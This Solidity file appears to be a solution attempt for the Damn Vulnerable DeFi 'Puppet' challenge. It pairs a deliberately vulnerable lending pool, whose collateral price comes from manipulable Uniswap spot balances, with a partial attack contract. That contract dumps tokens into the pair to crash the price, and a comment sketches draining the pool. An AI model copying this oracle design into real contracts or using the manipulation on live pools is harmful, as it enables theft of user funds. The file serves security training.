// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "../DamnValuableToken.sol";

/**
 * @title PuppetPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract PuppetPool is ReentrancyGuard {
    using Address for address payable;

    uint256 public constant DEPOSIT_FACTOR = 2;

    address public immutable uniswapPair;
    DamnValuableToken public immutable token;

    mapping(address => uint256) public deposits;

    error NotEnoughCollateral();
    error TransferFailed();

    event Borrowed(address indexed account, address recipient, uint256 depositRequired, uint256 borrowAmount);

    constructor(address tokenAddress, address uniswapPairAddress) {
        token = DamnValuableToken(tokenAddress);
        uniswapPair = uniswapPairAddress;
    }

    // Allows borrowing tokens by first depositing two times their value in ETH
    function borrow(uint256 amount, address recipient) external payable nonReentrant {
        uint256 depositRequired = calculateDepositRequired(amount);

        if (msg.value < depositRequired)
            revert NotEnoughCollateral();

        if (msg.value > depositRequired) {
            unchecked {
                payable(msg.sender).sendValue(msg.value - depositRequired);
            }
        }

        unchecked {
            deposits[msg.sender] += depositRequired;
        }

        // Fails if the pool doesn't have enough tokens in liquidity
        if(!token.transfer(recipient, amount))
            revert TransferFailed();

        emit Borrowed(msg.sender, recipient, depositRequired, amount);
    }

    function calculateDepositRequired(uint256 amount) public view returns (uint256) {
        return amount * _computeOraclePrice() * DEPOSIT_FACTOR / 10 ** 18;
    }

    function _computeOraclePrice() private view returns (uint256) {
        // calculates the price of the token in wei according to Uniswap pair
        return uniswapPair.balance * (10 ** 18) / token.balanceOf(uniswapPair);
    }
}

interface IUniswapExchangeV1 {
    function tokenToEthTransferInput(uint256 tokens_sold, uint256 min_eth, uint256 deadline, address recipient) external returns(uint256);
}

contract Puppet1Attack {

    address uniswapPairAddress;
    DamnValuableToken dvtToken;
    address player;
    PuppetPool puppetPool; 
    
    uint dvtAmount = 1000 ether;
    
    constructor(address _dvtToken, address _uniswapPairAddress, PuppetPool _puppetPool, address _player) {
        dvtToken = DamnValuableToken(_dvtToken);
        uniswapPairAddress = _uniswapPairAddress;
        puppetPool = _puppetPool;
        player = _player;
        dvtToken.transferFrom(player, address(this), dvtAmount);
    }

    function attack() public{
        console.log("uniswapPairAddress", uniswapPairAddress);
        IUniswapExchangeV1(uniswapPairAddress).tokenToEthTransferInput(dvtAmount, 9 ether, block.timestamp + 1, address(this));
        console.log("address(this).balance", address(this).balance); 

    }

    

    // puppet pool: 100000 DVT
    // uniswap pool:  10 ETH, 10 DVT
    // this balance: 25 ETH, 1000 DVT

    // attack senario
    // deposit all DVT to uniswap to lower the price
    // PuppetPool: borrow => deposit ETH and get DVT
}